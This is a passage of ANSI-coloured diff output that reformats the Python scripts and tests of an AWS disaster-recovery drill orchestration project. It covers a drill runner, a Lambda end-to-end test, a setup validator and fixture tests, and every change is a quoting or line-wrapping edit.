):\u001b[0m\n\u001b[32m+                                print(\u001b[0m\n\u001b[32m+                                    f\"Server {server['sourceServerID']} launch failed\"\u001b[0m\n\u001b[32m+                                )\u001b[0m\n\u001b[32m+\u001b[0m\n                     return None\n\u001b[31m-                    \u001b[0m\n\u001b[32m+\u001b[0m\n             time.sleep(30)  # Wait 30 seconds before checking again\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n         except ClientError as e:\n             print(f\"Error monitoring job: {e}\")\n             time.sleep(30)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(\"Timeout reached while waiting for drill completion\")\n     return None\n\u001b[32m+\u001b[0m\n \n def print_cleanup_instructions(recovery_instance_id):\n     \"\"\"\n     Print instructions for cleaning up the drill resources\n     \"\"\"\n     print(\"\\n\" + \"=\" * 60)\n     print(\"IMPORTANT: CLEANUP INSTRUCTIONS\")\n     print(\"=\" * 60)\n     print(\"The drill has created recovery instances that will incur charges.\")\n\u001b[31m-    print(\"Remember to terminate the drill instances when testing is complete.\")\u001b[0m\n\u001b[32m+    print(\u001b[0m\n\u001b[32m+        \"Remember to terminate the drill instances when testing is complete.\"\u001b[0m\n\u001b[32m+    )\u001b[0m\n     print()\n     print(\"To terminate the drill instance:\")\n     print(f\"1. Via AWS CLI:\")\n\u001b[31m-    print(f\"   aws drs terminate-recovery-instances --recovery-instance-ids {recovery_instance_id}\")\u001b[0m\n\u001b[32m+    print(\u001b[0m\n\u001b[32m+        f\"   aws drs terminate-recovery-instances --recovery-instance-ids {recovery_instance_id}\"\u001b[0m\n\u001b[32m+    )\u001b[0m\n     print()\n     print(\"2. Via AWS Console:\")\n     print(\"   - Go to AWS DRS Console\")\n     print(\"   - Select the recovery instance\")\n     print(\"   - Choose 'Terminate recovery instances'\")\n     print(\"=\" * 60)\n \n\u001b[32m+\u001b[0m\n if __name__ == \"__main__\":\n     # Configuration\n     SOURCE_SERVER_ID = \"s-3c1730a9e0771ea14\"\n     AWS_REGION = \"us-east-1\"  # Update with your region\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(\"Starting AWS DRS Drill...\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Run the drill\n     result = run_drs_drill(SOURCE_SERVER_ID, AWS_REGION)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     if result:\n         print(f\"\\n\u2705 Drill completed successfully!\")\n         print(f\"Job ID: {result['job_id']}\")\n         print(f\"Recovery Instance: {result['recovery_instance_id']}\")\n         print(f\"EC2 Instance: {result['ec2_instance_id']}\")\n\u001b[1m--- tests/python/test_with_lambda_invoke.py\t2025-11-30 05:34:16.029924+00:00\u001b[0m\n\u001b[1m+++ tests/python/test_with_lambda_invoke.py\t2026-01-02 15:49:03.584266+00:00\u001b[0m\n\u001b[36m@@ -6,218 +6,230 @@\u001b[0m\n import time\n import boto3\n from datetime import datetime, timezone\n import logging\n \n\u001b[31m-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')\u001b[0m\n\u001b[32m+logging.basicConfig(\u001b[0m\n\u001b[32m+    level=logging.INFO, format=\"%(asctime)s - %(levelname)s - %(message)s\"\u001b[0m\n\u001b[32m+)\u001b[0m\n logger = logging.getLogger(__name__)\n\u001b[32m+\u001b[0m\n \n class DirectLambdaTest:\n     \"\"\"Test using direct Lambda invocation.\"\"\"\n\u001b[31m-    \u001b[0m\n\u001b[31m-    def __init__(self, plan_id: str, region: str = 'us-east-1'):\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    def __init__(self, plan_id: str, region: str = \"us-east-1\"):\u001b[0m\n         self.plan_id = plan_id\n         self.region = region\n\u001b[31m-        self.lambda_client = boto3.client('lambda', region_name=region)\u001b[0m\n\u001b[31m-        self.dynamodb = boto3.client('dynamodb', region_name=region)\u001b[0m\n\u001b[31m-        self.drs = boto3.client('drs', region_name=region)\u001b[0m\n\u001b[31m-        self.execution_table = 'drs-orchestration-execution-history-test'\u001b[0m\n\u001b[31m-        self.lambda_function = 'drs-orchestration-api-handler-test'\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        self.lambda_client = boto3.client(\"lambda\", region_name=region)\u001b[0m\n\u001b[32m+        self.dynamodb = boto3.client(\"dynamodb\", region_name=region)\u001b[0m\n\u001b[32m+        self.drs = boto3.client(\"drs\", region_name=region)\u001b[0m\n\u001b[32m+        self.execution_table = \"drs-orchestration-execution-history-test\"\u001b[0m\n\u001b[32m+        self.lambda_function = \"drs-orchestration-api-handler-test\"\u001b[0m\n\u001b[32m+\u001b[0m\n     def run_test(self) -> dict:\n         \"\"\"Run end-to-end test.\"\"\"\n         try:\n\u001b[31m-            logger.info(\"=\"*80)\u001b[0m\n\u001b[32m+            logger.info(\"=\" * 80)\u001b[0m\n             logger.info(\"AUTOMATED TEST - Direct Lambda Invocation\")\n             logger.info(f\"Plan ID: {self.plan_id}\")\n\u001b[31m-            logger.info(\"=\"*80)\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+            logger.info(\"=\" * 80)\u001b[0m\n\u001b[32m+\u001b[0m\n             # Phase 1: Trigger execution via Lambda\n             logger.info(\"\\n[PHASE 1] Invoking Lambda to trigger execution...\")\n             execution_id = self._invoke_lambda_to_execute()\n             logger.info(f\"\u2705 Execution ID: {execution_id}\")\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Phase 2: Monitor execution\n             logger.info(\"\\n[PHASE 2] Monitoring execution...\")\n             execution_data = self._monitor_execution(execution_id)\n             logger.info(f\"\u2705 Execution Status: {execution_data.get('Status')}\")\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Phase 3: Verify wave data\n             logger.info(\"\\n[PHASE 3] Verifying wave data...\")\n             waves = self._verify_waves(execution_data)\n             logger.info(f\"\u2705 Waves verified: {len(waves)}\")\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Phase 4: Check DRS jobs\n             logger.info(\"\\n[PHASE 4] Checking DRS jobs...\")\n             drs_status = self._check_drs_jobs(waves)\n             logger.info(f\"\u2705 DRS jobs checked\")\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Results\n\u001b[31m-            logger.info(\"\\n\" + \"=\"*80)\u001b[0m\n\u001b[32m+            logger.info(\"\\n\" + \"=\" * 80)\u001b[0m\n             logger.info(\"TEST RESULTS\")\n\u001b[31m-            logger.info(\"=\"*80)\u001b[0m\n\u001b[32m+            logger.info(\"=\" * 80)\u001b[0m\n             logger.info(f\"Execution ID: {execution_id}\")\n             logger.info(f\"Status: {execution_data.get('Status')}\")\n             logger.info(f\"Waves: {len(waves)}\")\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             for wave in waves:\n\u001b[31m-                job_id = wave.get('JobId', 'NO JOB ID')\u001b[0m\n\u001b[31m-                status = wave.get('Status', 'UNKNOWN')\u001b[0m\n\u001b[31m-                logger.info(f\"  Wave {wave.get('WaveId')}: {status} (Job: {job_id})\")\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+                job_id = wave.get(\"JobId\", \"NO JOB ID\")\u001b[0m\n\u001b[32m+                status = wave.get(\"Status\", \"UNKNOWN\")\u001b[0m\n\u001b[32m+                logger.info(\u001b[0m\n\u001b[32m+                    f\"  Wave {wave.get('WaveId')}: {status} (Job: {job_id})\"\u001b[0m\n\u001b[32m+                )\u001b[0m\n\u001b[32m+\u001b[0m\n             logger.info(\"\\n\u2705 TEST COMPLETED\")\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             return {\n\u001b[31m-                'success': True,\u001b[0m\n\u001b[31m-                'execution_id': execution_id,\u001b[0m\n\u001b[31m-                'status': execution_data.get('Status'),\u001b[0m\n\u001b[31m-                'waves': waves\u001b[0m\n\u001b[32m+                \"success\": True,\u001b[0m\n\u001b[32m+                \"execution_id\": execution_id,\u001b[0m\n\u001b[32m+                \"status\": execution_data.get(\"Status\"),\u001b[0m\n\u001b[32m+                \"waves\": waves,\u001b[0m\n             }\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n         except Exception as e:\n             logger.error(f\"\u274c Test failed: {str(e)}\", exc_info=True)\n\u001b[31m-            return {'success': False, 'error': str(e)}\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+            return {\"success\": False, \"error\": str(e)}\u001b[0m\n\u001b[32m+\u001b[0m\n     def _invoke_lambda_to_execute(self) -> str:\n         \"\"\"Invoke Lambda to execute recovery plan.\"\"\"\n         payload = {\n\u001b[31m-            'httpMethod': 'POST',\u001b[0m\n\u001b[31m-            'path': f'/api/recovery-plans/{self.plan_id}/execute',\u001b[0m\n\u001b[31m-            'body': json.dumps({'isDrill': True})\u001b[0m\n\u001b[32m+            \"httpMethod\": \"POST\",\u001b[0m\n\u001b[32m+            \"path\": f\"/api/recovery-plans/{self.plan_id}/execute\",\u001b[0m\n\u001b[32m+            \"body\": json.dumps({\"isDrill\": True}),\u001b[0m\n         }\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         response = self.lambda_client.invoke(\n             FunctionName=self.lambda_function,\n\u001b[31m-            InvocationType='RequestResponse',\u001b[0m\n\u001b[31m-            Payload=json.dumps(payload)\u001b[0m\n\u001b[32m+            InvocationType=\"RequestResponse\",\u001b[0m\n\u001b[32m+            Payload=json.dumps(payload),\u001b[0m\n         )\n\u001b[31m-        \u001b[0m\n\u001b[31m-        result = json.loads(response['Payload'].read())\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        if result.get('statusCode') != 200:\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        result = json.loads(response[\"Payload\"].read())\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        if result.get(\"statusCode\") != 200:\u001b[0m\n             raise Exception(f\"Lambda invocation failed: {result}\")\n\u001b[31m-        \u001b[0m\n\u001b[31m-        body = json.loads(result.get('body', '{}'))\u001b[0m\n\u001b[31m-        execution_id = body.get('ExecutionId')\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        body = json.loads(result.get(\"body\", \"{}\"))\u001b[0m\n\u001b[32m+        execution_id = body.get(\"ExecutionId\")\u001b[0m\n\u001b[32m+\u001b[0m\n         if not execution_id:\n             raise Exception(f\"No ExecutionId in response: {body}\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         return execution_id\n\u001b[31m-    \u001b[0m\n\u001b[31m-    def _monitor_execution(self, execution_id: str, timeout: int = 300) -> dict:\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    def _monitor_execution(\u001b[0m\n\u001b[32m+        self, execution_id: str, timeout: int = 300\u001b[0m\n\u001b[32m+    ) -> dict:\u001b[0m\n         \"\"\"Monitor execution until complete or timeout.\"\"\"\n         start_time = time.time()\n         last_status = None\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         while time.time() - start_time < timeout:\n             response = self.dynamodb.get_item(\n                 TableName=self.execution_table,\n                 Key={\n\u001b[31m-                    'ExecutionId': {'S': execution_id},\u001b[0m\n\u001b[31m-                    'PlanId': {'S': self.plan_id}\u001b[0m\n\u001b[31m-                }\u001b[0m\n\u001b[32m+                    \"ExecutionId\": {\"S\": execution_id},\u001b[0m\n\u001b[32m+                    \"PlanId\": {\"S\": self.plan_id},\u001b[0m\n\u001b[32m+                },\u001b[0m\n             )\n\u001b[31m-            \u001b[0m\n\u001b[31m-            if 'Item' not in response:\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+            if \"Item\" not in response:\u001b[0m\n                 logger.warning(\"Execution not found, waiting...\")\n                 time.sleep(5)\n                 continue\n\u001b[31m-            \u001b[0m\n\u001b[31m-            execution = self._parse_item(response['Item'])\u001b[0m\n\u001b[31m-            status = execution.get('Status', 'UNKNOWN')\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+            execution = self._parse_item(response[\"Item\"])\u001b[0m\n\u001b[32m+            status = execution.get(\"Status\", \"UNKNOWN\")\u001b[0m\n\u001b[32m+\u001b[0m\n             if status != last_status:\n\u001b[31m-                logger.info(f\"  Status: {status} (elapsed: {int(time.time() - start_time)}s)\")\u001b[0m\n\u001b[32m+                logger.info(\u001b[0m\n\u001b[32m+                    f\"  Status: {status} (elapsed: {int(time.time() - start_time)}s)\"\u001b[0m\n\u001b[32m+                )\u001b[0m\n                 last_status = status\n\u001b[31m-            \u001b[0m\n\u001b[31m-            if status in ['COMPLETED', 'FAILED', 'TIMEOUT']:\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+            if status in [\"COMPLETED\", \"FAILED\", \"TIMEOUT\"]:\u001b[0m\n                 return execution\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             time.sleep(15)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         raise TimeoutError(f\"Execution monitoring timed out after {timeout}s\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def _verify_waves(self, execution_data: dict) -> list:\n         \"\"\"Verify wave data structure.\"\"\"\n\u001b[31m-        waves = execution_data.get('Waves', [])\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        waves = execution_data.get(\"Waves\", [])\u001b[0m\n\u001b[32m+\u001b[0m\n         for wave in waves:\n\u001b[31m-            wave_id = wave.get('WaveId', 'unknown')\u001b[0m\n\u001b[31m-            job_id = wave.get('JobId')\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+            wave_id = wave.get(\"WaveId\", \"unknown\")\u001b[0m\n\u001b[32m+            job_id = wave.get(\"JobId\")\u001b[0m\n\u001b[32m+\u001b[0m\n             if job_id:\n                 logger.info(f\"  \u2705 Wave {wave_id}: JobId = {job_id}\")\n             else:\n\u001b[31m-                logger.warning(f\"  \u26a0\ufe0f  Wave {wave_id}: NO JobId (BUG 1 present!)\")\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+                logger.warning(\u001b[0m\n\u001b[32m+                    f\"  \u26a0\ufe0f  Wave {wave_id}: NO JobId (BUG 1 present!)\"\u001b[0m\n\u001b[32m+                )\u001b[0m\n\u001b[32m+\u001b[0m\n         return waves\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def _check_drs_jobs(self, waves: list) -> dict:\n         \"\"\"Check DRS job status.\"\"\"\n         results = {}\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         for wave in waves:\n\u001b[31m-            job_id = wave.get('JobId')\u001b[0m\n\u001b[32m+            job_id = wave.get(\"JobId\")\u001b[0m\n             if not job_id:\n                 continue\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             try:\n\u001b[31m-                response = self.drs.describe_jobs(filters={'jobIDs': [job_id]})\u001b[0m\n\u001b[31m-                if response.get('items'):\u001b[0m\n\u001b[31m-                    job = response['items'][0]\u001b[0m\n\u001b[31m-                    status = job.get('status', 'UNKNOWN')\u001b[0m\n\u001b[32m+                response = self.drs.describe_jobs(filters={\"jobIDs\": [job_id]})\u001b[0m\n\u001b[32m+                if response.get(\"items\"):\u001b[0m\n\u001b[32m+                    job = response[\"items\"][0]\u001b[0m\n\u001b[32m+                    status = job.get(\"status\", \"UNKNOWN\")\u001b[0m\n                     logger.info(f\"  DRS Job {job_id}: {status}\")\n                     results[job_id] = status\n             except Exception as e:\n                 logger.error(f\"  Error checking job {job_id}: {str(e)}\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         return results\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def _parse_item(self, item: dict) -> dict:\n         \"\"\"Parse DynamoDB item to dict.\"\"\"\n         result = {}\n         for key, value in item.items():\n\u001b[31m-            if 'S' in value:\u001b[0m\n\u001b[31m-                result[key] = value['S']\u001b[0m\n\u001b[31m-            elif 'N' in value:\u001b[0m\n\u001b[31m-                result[key] = int(value['N'])\u001b[0m\n\u001b[31m-            elif 'L' in value:\u001b[0m\n\u001b[31m-                result[key] = [self._parse_value(v) for v in value['L']]\u001b[0m\n\u001b[31m-            elif 'M' in value:\u001b[0m\n\u001b[31m-                result[key] = self._parse_item(value['M'])\u001b[0m\n\u001b[31m-            elif 'BOOL' in value:\u001b[0m\n\u001b[31m-                result[key] = value['BOOL']\u001b[0m\n\u001b[32m+            if \"S\" in value:\u001b[0m\n\u001b[32m+                result[key] = value[\"S\"]\u001b[0m\n\u001b[32m+            elif \"N\" in value:\u001b[0m\n\u001b[32m+                result[key] = int(value[\"N\"])\u001b[0m\n\u001b[32m+            elif \"L\" in value:\u001b[0m\n\u001b[32m+                result[key] = [self._parse_value(v) for v in value[\"L\"]]\u001b[0m\n\u001b[32m+            elif \"M\" in value:\u001b[0m\n\u001b[32m+                result[key] = self._parse_item(value[\"M\"])\u001b[0m\n\u001b[32m+            elif \"BOOL\" in value:\u001b[0m\n\u001b[32m+                result[key] = value[\"BOOL\"]\u001b[0m\n         return result\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def _parse_value(self, value: dict):\n         \"\"\"Parse DynamoDB value.\"\"\"\n\u001b[31m-        if 'S' in value:\u001b[0m\n\u001b[31m-            return value['S']\u001b[0m\n\u001b[31m-        elif 'N' in value:\u001b[0m\n\u001b[31m-            return int(value['N'])\u001b[0m\n\u001b[31m-        elif 'M' in value:\u001b[0m\n\u001b[31m-            return self._parse_item(value['M'])\u001b[0m\n\u001b[32m+        if \"S\" in value:\u001b[0m\n\u001b[32m+            return value[\"S\"]\u001b[0m\n\u001b[32m+        elif \"N\" in value:\u001b[0m\n\u001b[32m+            return int(value[\"N\"])\u001b[0m\n\u001b[32m+        elif \"M\" in value:\u001b[0m\n\u001b[32m+            return self._parse_item(value[\"M\"])\u001b[0m\n         return value\n \n \n def main():\n     import argparse\n\u001b[32m+\u001b[0m\n     parser = argparse.ArgumentParser()\n\u001b[31m-    parser.add_argument('--plan-id', required=True)\u001b[0m\n\u001b[31m-    parser.add_argument('--region', default='us-east-1')\u001b[0m\n\u001b[32m+    parser.add_argument(\"--plan-id\", required=True)\u001b[0m\n\u001b[32m+    parser.add_argument(\"--region\", default=\"us-east-1\")\u001b[0m\n     args = parser.parse_args()\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     test = DirectLambdaTest(args.plan_id, args.region)\n     results = test.run_test()\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Save results\n     output_file = f\"test_results_{results.get('execution_id', 'failed')}.json\"\n\u001b[31m-    with open(output_file, 'w') as f:\u001b[0m\n\u001b[32m+    with open(output_file, \"w\") as f:\u001b[0m\n         json.dump(results, f, indent=2, default=str)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     logger.info(f\"\\nResults saved to: {output_file}\")\n\u001b[31m-    exit(0 if results['success'] else 1)\u001b[0m\n\u001b[31m-\u001b[0m\n\u001b[31m-\u001b[0m\n\u001b[31m-if __name__ == '__main__':\u001b[0m\n\u001b[32m+    exit(0 if results[\"success\"] else 1)\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+if __name__ == \"__main__\":\u001b[0m\n     main()\n\u001b[1m--- tests/python/validate_setup.py\t2025-11-19 22:53:56.631855+00:00\u001b[0m\n\u001b[1m+++ tests/python/validate_setup.py\t2026-01-02 15:49:03.587352+00:00\u001b[0m\n\u001b[36m@@ -4,104 +4,111 @@\u001b[0m\n Run this script to verify all dependencies and configuration are correct.\n \"\"\"\n import sys\n import os\n \n\u001b[32m+\u001b[0m\n def check_python_version():\n     \"\"\"Verify Python version is 3.12+\"\"\"\n     version = sys.version_info\n     if version.major == 3 and version.minor >= 12:\n\u001b[31m-        print(f\"\u2705 Python version: {version.major}.{version.minor}.{version.micro}\")\u001b[0m\n\u001b[32m+        print(\u001b[0m\n\u001b[32m+            f\"\u2705 Python version: {version.major}.{version.minor}.{version.micro}\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n         return True\n     else:\n\u001b[31m-        print(f\"\u274c Python version {version.major}.{version.minor} is too old. Need 3.12+\")\u001b[0m\n\u001b[32m+        print(\u001b[0m\n\u001b[32m+            f\"\u274c Python version {version.major}.{version.minor} is too old. Need 3.12+\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n         return False\n\u001b[32m+\u001b[0m\n \n def check_dependencies():\n     \"\"\"Check if required packages can be imported\"\"\"\n     required_packages = [\n         (\"pytest\", \"pytest\"),\n         (\"moto\", \"moto\"),\n         (\"hypothesis\", \"hypothesis\"),\n         (\"boto3\", \"boto3\"),\n     ]\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     all_ok = True\n     for package_name, import_name in required_packages:\n         try:\n             __import__(import_name)\n             print(f\"\u2705 {package_name} installed\")\n         except ImportError:\n\u001b[31m-            print(f\"\u274c {package_name} not installed - run: pip install -r requirements.txt\")\u001b[0m\n\u001b[32m+            print(\u001b[0m\n\u001b[32m+                f\"\u274c {package_name} not installed - run: pip install -r requirements.txt\"\u001b[0m\n\u001b[32m+            )\u001b[0m\n             all_ok = False\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     return all_ok\n\u001b[32m+\u001b[0m\n \n def check_directory_structure():\n     \"\"\"Verify test directory structure exists\"\"\"\n     base_dir = os.path.dirname(__file__)\n     required_dirs = [\n         \"unit\",\n         \"integration\",\n         \"e2e\",\n         \"fixtures\",\n         \"mocks\",\n\u001b[31m-        \"utils\"\u001b[0m\n\u001b[32m+        \"utils\",\u001b[0m\n     ]\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     all_ok = True\n     for dir_name in required_dirs:\n         dir_path = os.path.join(base_dir, dir_name)\n         if os.path.isdir(dir_path):\n             print(f\"\u2705 Directory exists: {dir_name}/\")\n         else:\n             print(f\"\u274c Directory missing: {dir_name}/\")\n             all_ok = False\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     return all_ok\n\u001b[32m+\u001b[0m\n \n def check_config_files():\n     \"\"\"Verify configuration files exist\"\"\"\n     base_dir = os.path.dirname(__file__)\n\u001b[31m-    required_files = [\u001b[0m\n\u001b[31m-        \"pytest.ini\",\u001b[0m\n\u001b[31m-        \"conftest.py\",\u001b[0m\n\u001b[31m-        \"requirements.txt\"\u001b[0m\n\u001b[31m-    ]\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+    required_files = [\"pytest.ini\", \"conftest.py\", \"requirements.txt\"]\u001b[0m\n\u001b[32m+\u001b[0m\n     all_ok = True\n     for file_name in required_files:\n         file_path = os.path.join(base_dir, file_name)\n         if os.path.isfile(file_path):\n             print(f\"\u2705 Config file exists: {file_name}\")\n         else:\n             print(f\"\u274c Config file missing: {file_name}\")\n             all_ok = False\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     return all_ok\n\u001b[32m+\u001b[0m\n \n def main():\n     \"\"\"Run all validation checks\"\"\"\n     print(\"=\" * 60)\n     print(\"Execution Engine Test Infrastructure Validation\")\n     print(\"=\" * 60)\n     print()\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     checks = [\n         (\"Python Version\", check_python_version),\n         (\"Directory Structure\", check_directory_structure),\n         (\"Configuration Files\", check_config_files),\n         (\"Python Dependencies\", check_dependencies),\n     ]\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     results = []\n     for check_name, check_func in checks:\n         print(f\"\\n{check_name}:\")\n         print(\"-\" * 40)\n         result = check_func()\n         results.append(result)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print()\n     print(\"=\" * 60)\n     if all(results):\n         print(\"\u2705 All checks passed! Test infrastructure is ready.\")\n         print()\n\u001b[36m@@ -112,7 +119,8 @@\u001b[0m\n         return 0\n     else:\n         print(\"\u274c Some checks failed. Please fix the issues above.\")\n         return 1\n \n\u001b[32m+\u001b[0m\n if __name__ == \"__main__\":\n     sys.exit(main())\n\u001b[1m--- tests/python/unit/test_fixtures.py\t2025-11-19 23:02:44.304167+00:00\u001b[0m\n\u001b[1m+++ tests/python/unit/test_fixtures.py\t2026-01-02 15:49:03.593573+00:00\u001b[0m\n\u001b[36m@@ -11,108 +11,108 @@\u001b[0m\n     create_mixed_execution_plan,\n     create_plan_with_transitive_dependencies,\n     create_plan_with_wait_times,\n     create_real_drs_server_plan,\n     get_all_fixtures,\n\u001b[31m-    get_fixture\u001b[0m\n\u001b[32m+    get_fixture,\u001b[0m\n )\n \n \n class TestRecoveryPlanFixtures:\n     \"\"\"Test suite for recovery plan fixtures.\"\"\"\n \n     def test_single_wave_plan_structure(self):\n         \"\"\"Test single wave plan has correct structure.\"\"\"\n         plan = create_single_wave_plan()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert plan[\"PlanId\"] == \"test-plan-001\"\n         assert len(plan[\"Waves\"]) == 1\n         assert plan[\"Waves\"][0][\"WaveNumber\"] == 1\n         assert plan[\"Waves\"][0][\"ExecutionType\"] == \"SEQUENTIAL\"\n         assert len(plan[\"Waves\"][0][\"ServerIds\"]) == 2\n \n     def test_three_wave_plan_structure(self):\n         \"\"\"Test three wave plan has correct structure and dependencies.\"\"\"\n         plan = create_three_wave_plan()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert len(plan[\"Waves\"]) == 3\n         assert plan[\"Waves\"][0][\"Dependencies\"] == []\n         assert plan[\"Waves\"][1][\"Dependencies\"] == [\"Wave-1\"]\n         assert plan[\"Waves\"][2][\"Dependencies\"] == [\"Wave-2\"]\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Verify execution types\n         assert plan[\"Waves\"][0][\"ExecutionType\"] == \"SEQUENTIAL\"\n         assert plan[\"Waves\"][1][\"ExecutionType\"] == \"PARALLEL\"\n         assert plan[\"Waves\"][2][\"ExecutionType\"] == \"PARALLEL\"\n \n     def test_five_wave_plan_structure(self):\n         \"\"\"Test five wave plan has correct structure.\"\"\"\n         plan = create_five_wave_plan()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert len(plan[\"Waves\"]) == 5\n         assert plan[\"Waves\"][0][\"WaveName\"] == \"Foundation\"\n         assert plan[\"Waves\"][4][\"WaveName\"] == \"Edge\"\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Verify dependency chain\n         for i in range(1, 5):\n             assert plan[\"Waves\"][i][\"Dependencies\"] == [f\"Wave-{i}\"]\n \n     def test_parallel_wave_plan(self):\n         \"\"\"Test parallel wave plan with custom server count.\"\"\"\n         server_count = 6\n         plan = create_parallel_wave_plan(server_count=server_count)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert len(plan[\"Waves\"]) == 1\n         assert len(plan[\"Waves\"][0][\"ServerIds\"]) == server_count\n         assert plan[\"Waves\"][0][\"ExecutionType\"] == \"PARALLEL\"\n         assert all(order == 1 for order in plan[\"Waves\"][0][\"ExecutionOrder\"])\n \n     def test_mixed_execution_plan(self):\n         \"\"\"Test plan with mixed sequential and parallel execution.\"\"\"\n         plan = create_mixed_execution_plan()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert len(plan[\"Waves\"]) == 2\n         assert plan[\"Waves\"][0][\"ExecutionType\"] == \"SEQUENTIAL\"\n         assert plan[\"Waves\"][1][\"ExecutionType\"] == \"PARALLEL\"\n         assert plan[\"Waves\"][1][\"Dependencies\"] == [\"Wave-1\"]\n \n     def test_transitive_dependencies(self):\n         \"\"\"Test plan with transitive dependencies.\"\"\"\n         plan = create_plan_with_transitive_dependencies()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert len(plan[\"Waves\"]) == 3\n         assert plan[\"Waves\"][0][\"Dependencies\"] == []\n         assert plan[\"Waves\"][1][\"Dependencies\"] == [\"Wave-1\"]\n         assert plan[\"Waves\"][2][\"Dependencies\"] == [\"Wave-2\"]\n \n     def test_wait_times_plan(self):\n         \"\"\"Test plan with configurable wait times.\"\"\"\n         wait_times = [30, 60, 90]\n         plan = create_plan_with_wait_times(wait_times=wait_times)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert len(plan[\"Waves\"]) == 3\n         for i, wait_time in enumerate(wait_times):\n             assert plan[\"Waves\"][i][\"WaitTimeSeconds\"] == wait_time\n \n     def test_real_drs_server_plan(self):\n         \"\"\"Test plan with real DRS server IDs.\"\"\"\n         plan = create_real_drs_server_plan()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert plan[\"AccountId\"] == \"777788889999\"\n         assert plan[\"Region\"] == \"us-east-1\"\n         assert len(plan[\"Waves\"]) == 3\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Verify real server ID format (s-{17 hex chars})\n         for wave in plan[\"Waves\"]:\n             for server_id in wave[\"ServerIds\"]:\n                 assert server_id.startswith(\"s-\")\n                 assert len(server_id) == 19  # s- + 17 chars\n \n     def test_get_all_fixtures(self):\n         \"\"\"Test get_all_fixtures returns all fixtures.\"\"\"\n         fixtures = get_all_fixtures()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert len(fixtures) == 8\n         assert \"single_wave\" in fixtures\n         assert \"three_wave\" in fixtures\n         assert \"five_wave\" in fixtures\n         assert \"parallel\" in fixtures\n\u001b[36m@@ -136,42 +136,65 @@\u001b[0m\n         with pytest.raises(ValueError, 